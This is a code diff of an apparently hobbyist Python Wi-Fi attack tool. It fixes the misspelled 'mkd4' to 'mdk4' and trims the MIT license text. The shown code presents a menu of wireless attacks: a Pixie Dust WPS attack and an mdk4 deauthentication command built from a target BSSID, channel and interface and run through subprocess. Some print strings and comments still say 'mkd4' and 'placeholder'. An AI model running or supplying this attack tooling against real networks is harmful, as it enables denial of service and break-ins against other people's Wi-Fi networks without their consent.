@@ -1,25 +1,6 @@
 ''''
 MIT License
-
 Copyright (c) 2025 Alex
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
 '''
 
 from scapy.all import sniff, Dot11, Dot11Elt
@@ -127,12 +108,12 @@ def run_pixie_dust():
         print(f"An error occurred: {e}")
 
 
-def run_mkd4():
+def run_mdk4():
     try:
         print("\nRunning mkd4 attack...")
         # Assuming mkd4 is a command that needs to be run with specific parameters
 
-        subprocess.call(shlex.split(f"mkd4 d -c {target['Channel']} -b {target['BSSID']} -i {interface}"))
+        subprocess.call(shlex.split(f"mdk4 d -c {target['Channel']} -b {target['BSSID']} -i {interface}"))
         print("mkd4 command executed (placeholder).")
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -140,14 +121,14 @@ while True:
     try:
         print("\nChoose an attack method:")
         print("1. Pixie Dust")
-        print("2. mkd4")
+        print("2. mdk4")
         print("3. Exit")
         option = input("Choose attack method: ")
 
         if option == '1':
             run_pixie_dust()
         elif option == '2':
-            run_mkd4()
+            run_mdk4()
         elif option == '3':
             print("Exiting.")
             break
